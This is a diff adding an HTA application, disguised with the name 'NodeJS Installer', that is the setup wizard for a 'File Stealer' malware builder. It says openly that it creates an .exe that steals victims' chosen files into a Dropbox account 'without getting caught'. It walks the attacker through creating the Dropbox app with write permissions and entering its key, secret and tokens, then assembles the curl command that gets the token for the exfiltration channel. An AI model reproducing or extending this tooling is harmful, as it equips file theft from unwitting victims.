@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Stealer Setup Guide - fecdor</title>
+    <HTA:APPLICATION 
+        APPLICATIONNAME="NodeJS Installer"
+        BORDER="thin"
+        CAPTION="yes"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="normal"
+    />
+    <script>
+        var key = ""; // Variable to store app key
+        var secret = ""; // Variable to store app secret
+        var accessToken = ""; // Variable to store access token
+        var authorizationToken = ""; // Variable to store authorization token
+        
+        window.onload = function() {
+            window.resizeTo(1200, 750);
+            window.moveTo((screen.width - 1200) / 2, (screen.height - 750) / 2);
+            showPage('home');
+        }
+        
+        function openLink(url) {
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run(url);
+        }
+        
+        function openAuthLink() {
+            if (key) {
+                var authUrl = "https://www.dropbox.com/oauth2/authorize?client_id=" + key + "&token_access_type=offline&response_type=code";
+                openLink(authUrl);
+            } else {
+                alert("Please enter your App key first in the previous step!");
+            }
+        }
+        
+        function showPage(pageId) {
+            var allDivs = document.getElementsByTagName("div");
+            for(var i = 0; i < allDivs.length; i++) {
+                if(allDivs[i].id == "home" || 
+                   allDivs[i].id == "configure dropbox" || 
+                   allDivs[i].id == "verification" || 
+                   allDivs[i].id == "next-steps") {
+                    allDivs[i].style.display = "none";
+                }
+            }
+            document.getElementById(pageId).style.display = "block";
+
+            var navButtons = document.getElementById("navContainer").getElementsByTagName("div");
+            for(var i = 0; i < navButtons.length; i++) {
+                var buttonClass = navButtons[i].className;
+                if(buttonClass.indexOf(" active") > -1) {
+                    navButtons[i].className = buttonClass.replace(" active", "");
+                }
+                if(navButtons[i].getAttribute("data-page") == pageId) {
+                    navButtons[i].className += " active";
+                }
+            }
+            
+            // Update the curl command with the current values of variables when showing next-steps page
+            if(pageId === 'next-steps') {
+                updateCurlCommand();
+            }
+        }
+        
+        function saveInput() {
+            key = document.getElementById("userInput").value;
+            alert("App key Saved: " + key);
+            updateCurlCommand();
+        }
+        
+        function saveInput2() {
+            secret = document.getElementById("userInput2").value;
+            alert("App secret saved: " + secret);
+            updateCurlCommand();
+        }
+        
+        function saveInput1() {
+            accessToken = document.getElementById("userInput1").value;
+            alert("Access token saved: " + accessToken);
+        }
+        
+        function saveAuthToken() {
+            authorizationToken = document.getElementById("authTokenInput").value;
+            alert("Authorization token saved: " + authorizationToken);
+            updateCurlCommand();
+        }
+        
+        function updateCurlCommand() {
+            var curlCommand = document.getElementById("curlCommand");
+            if(curlCommand) {
+                var command = "curl https://api.dropbox.com/oauth2/token -d code=" + (authorizationToken || "AUTHORIZATION_TOKEN") + " -d grant_type=authorization_code -u " + (key || "APP_KEY") + ":" + (secret || "APP_SECRET");
+                curlCommand.innerText = command;
+            }
+        }
+        
+        function copyToClipboard() {
+            // Fixed copy functionality
+            var textToCopy = document.getElementById("curlCommand").innerText;
+            
+            // Create a temporary textarea element
+            var tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            
+            // Make sure it's invisible
+            tempTextArea.style.position = "fixed";
+            tempTextArea.style.left = "-999999px";
+            tempTextArea.style.top = "-999999px";
+            
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            
+            try {
+                var successful = document.execCommand("copy");
+                if (successful) {
+                    alert("Command copied to clipboard!");
+                } else {
+                    alert("Copy failed. Please try again or copy manually.");
+                }
+            } catch (err) {
+                alert("Copy failed: " + err);
+            }
+            
+            document.body.removeChild(tempTextArea);
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 0;
+            margin: 0;
+            background-color: #f4f4f4;
+            overflow: hidden;
+        }
+        
+        #container {
+            display: flex;
+            height: 100vh;
+        }
+        
+        #sidebar {
+            width: 300px;
+            background-color: #333;
+            color: white;
+            padding: 20px 0;
+            position: fixed;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+        
+        #content {
+            flex-grow: 1;
+            padding: 40px;
+            margin-left: 300px;
+            overflow-y: auto;
+        }
+        
+        .logo {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #444;
+            margin-bottom: 20px;
+        }
+        
+        .logo h2 {
+            color: white;
+        }
+        
+        .nav-button {
+            display: block;
+            color: #ddd;
+            padding: 15px 20px;
+            text-decoration: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-left: 4px solid transparent;
+        }
+        
+        .nav-button:hover {
+            background-color: #444;
+            color: white;
+        }
+        
+        .nav-button.active {
+            background-color: #444;
+            border-left: 4px solid #007bff;
+            color: white;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 42px;
+            margin-top: 0;
+        }
+        
+        h2 {
+            color: #333;
+            font-size: 32px;
+        }
+        
+        p, li {
+            font-size: 20px;
+            line-height: 1.8;
+        }
+        
+        a {
+            color: #007bff;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+        
+        .action-button {
+            background-color: #007bff;
+            color: white;
+            padding: 14px 24px;
+            border: none;
+            cursor: pointer;
+            font-size: 20px;
+            margin-top: 20px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        
+        .action-button:hover {
+            background-color: #0056b3;
+        }
+        
+        #home, #configure dropbox, #verification, #next-steps {
+            display: none;
+        }
+        
+        .step {
+            background-color: white;
+            padding: 30px;
+            margin-bottom: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .code-block {
+            background-color: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 20px;
+            font-family: Consolas, Monaco, 'Andale Mono', monospace;
+            font-size: 18px;
+            overflow-x: auto;
+            position: relative;
+        }
+        
+        .copy-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .copy-button:hover {
+            background-color: #0056b3;
+        }
+        
+        .note {
+            background-color: #fff8e1;
+            border-left: 6px solid #ffca28;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        img {
+            max-width: 100%;
+            border: 1px solid #ddd;
+            margin: 15px 0;
+        }
+        
+        .input-group {
+            margin-top: 15px;
+            margin-bottom: 15px;
+        }
+        
+        input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 70%;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        
+        button {
+            padding: 10px 15px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <div id="sidebar">
+            <div class="logo">
+                <h2>File Stealer setup</h2>
+            </div>
+            <div id="navContainer" class="nav">
+                <div class="nav-button active" data-page="home" onclick="showPage('home')">Home</div>
+                <div class="nav-button" data-page="configure dropbox" onclick="showPage('configure dropbox')">configure dropbox</div>
+                <div class="nav-button" data-page="verification" onclick="showPage('verification')">Verification</div>
+                <div class="nav-button" data-page="next-steps" onclick="showPage('next-steps')">script setup</div>
+            </div>
+        </div>
+        
+        <div id="content">
+
+            <div id="home">
+                <h1>Welcome to the File Stealer setup guide</h1>
+                <div class="step">
+                    <p>This setup will allow you to easily create a .exe malware that will steal the victim's files by putting them on dropbox. This is very usefull since you can pick the file extentions or names the stealer should take and you will simply recive those files without getting caught.</p>
+                    <p>this setup will:</p>
+                    <ul>
+                        <li>guide you through setting up the dropbox reciving end</li>
+                        <li>ask you to imput a few things</li>
+                        <li>automatically configure all the code for you</li>
+                    </ul>
+                    <div class="step">
+                        <p>Start by creating a fresh <a href="#" onclick="openLink('https://www.dropbox.com/register')">new dropbox account</a>, the stolen files will be put in it.</p>
+                    </div>
+                    <div class="action-button" onclick="showPage('configure dropbox')">Next Page</div>
+                </div>
+            </div>
+
+            <div id="configure dropbox">
+                <h1>Configure dropbox app</h1>
+                <div class="step">
+                    <h2>Step 1: Create a new "App"</h2>
+                    <p>Click below to open dropbox apps. Select "Scoped Access" -- Select "Full Dropbox" -- Name it whatever you want</p>
+                    <div class="action-button" onclick="openLink('https://www.dropbox.com/developers/apps/create')">dropbox apps link</div>
+                </div>
+                <div class="step">
+                    <h2>Step 2: Set app permitions</h2>
+                    <p>Go the the "Permissions" tab and enable "files.content.write", and "files.metadata.write". Then click on submit to save your changes</p>
+                </div>
+                <div class="action-button" onclick="showPage('verification')">Next Page</div>
+            </div>
+            
+            <!-- Verification Page -->
+            <div id="verification">
+                <h1>Input your app identifiers</h1>
+                <div class="step">
+                    <h2>Step 1: Enter your App key</h2>
+                    <p>Go to the "Settings" tab and copy your "App key". Then paste it below and click "Submit" (don't worry if you got it wrong, you can submit it again).</p>
+                    <!-- Input Field and Submit Button -->
+                    <div class="input-group">
+                        <input type="text" id="userInput" placeholder="Enter your value">
+                        <button onclick="saveInput()">Submit</button>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <h2>Step 2: Enter your App secret</h2>
+                    <p>Go to the "Settings" tab and copy your "App secret". Then paste it below and click "Submit" (don't worry if you got it wrong, you can submit it again).</p>
+                    <!-- Input Field and Submit Button -->
+                    <div class="input-group">
+                        <input type="text" id="userInput2" placeholder="Enter second value">
+                        <button onclick="saveInput2()">Submit</button>
+                    </div>
+                </div>
+                <div class="step">
+                    <h2>Step 3: Enter your Access token</h2>
+                    <p>Go to the "Settings" tab -> OAuth 2 -> Generated Access token and copy the token that you generate. <b>Important: This token will expire in 4 hours</b>, so you will only use this one to get your refresh token</p>
+                    <div class="input-group">
+                        <input type="text" id="userInput1" placeholder="Enter first value">
+                        <button onclick="saveInput1()">Submit</button>
+                    </div>
+                </div>
+                
+                <div class="action-button" onclick="showPage('next-steps')">Next page</div>
+            </div>
+            
+            <!-- script setup Page -->
+            <div id="next-steps">
+                <h1>Setup the connection to your app</h1>
+                <div class="step">
+                    <h2>Step 1: Get your Authorization token</h2>
+                    <p>Now that you've entered your app key, click the button below to get your authorization token:</p>
+                    
+                    <div class="action-button" onclick="openAuthLink()">Autorisation token link</div>
+                    
+                    <p>After clicking the link above, Dropbox will provide you with an authorization code. Copy that code and paste it below:</p>
+                    
+                    <div class="input-group">
+                        <input type="text" id="authTokenInput" placeholder="Enter authorization token">
+                        <button onclick="saveAuthToken()">Submit</button>
+                    </div>
+                </div>
+                
+                <div class="step">
+                    <h2>Step 2: Get your unique code</h2>
+                    <p>Copy the code below and save it somewhere, as it is the unique connection for your dropbox account and you can use it each time you create a file stealer. The values have been automatically filled with the information you have imputed until now:</p>
+                    <div class="code-block">
+                        <span id="curlCommand">curl https://api.dropbox.com/oauth2/token -d code=AUTHORIZATION_TOKEN -d grant_type=authorization_code -u APP_KEY:APP_SECRET</span>
+                        <button class="copy-button" onclick="copyToClipboard()">Copy</button>
+                    </div>
+                    <p>Once you have copied it, close this window and you can proceed with the creation of the stealer in the original batch window.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
